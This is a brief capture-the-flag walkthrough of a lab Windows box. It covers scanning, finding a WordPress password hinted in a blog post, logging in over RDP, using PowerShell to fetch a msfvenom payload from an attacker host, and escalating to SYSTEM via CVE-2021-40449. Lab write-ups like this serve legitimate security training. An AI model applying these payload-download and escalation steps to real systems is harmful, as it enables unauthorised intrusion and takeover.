Started with a nmap scan
```
80 IIS 10.0
3389 RDP
```
Going to the site its just a normal default IIS web page so going to start a gobuster scan
```
/retro
```
going to the `/retro` we got a website and its running wordpress version `5.2.1` and we got one user `wade` and when we go to `/wp-admin/` it sends us to local host we can see the user `wade` is the only one that's been posting when looking at his profile and looking at all the articles there is one called `Ready player one` and if you read it it says that the main character has the same name as him and he made the password the name of his avatar `parzival` and we can log into the wordpress site as `wade` now we can also use these creds to log into the RDP `xfreerdp3 /v:10.10.40.39 /u:wade` and now we are on the RDP and now we have the user flag we can get a batter shell if we make a msfvenom payload and we need to use powershell to download the file `Invoke-WebRequest -Uri "http://10.6.37.77/payload.exe" -OutFile "C:\Users\Public|payload.exe"` snice we have a meterpreter session  we can run local exploit suggester and using exploit `CVE-2021-40449` and now we have system access to admin and we got the final flag 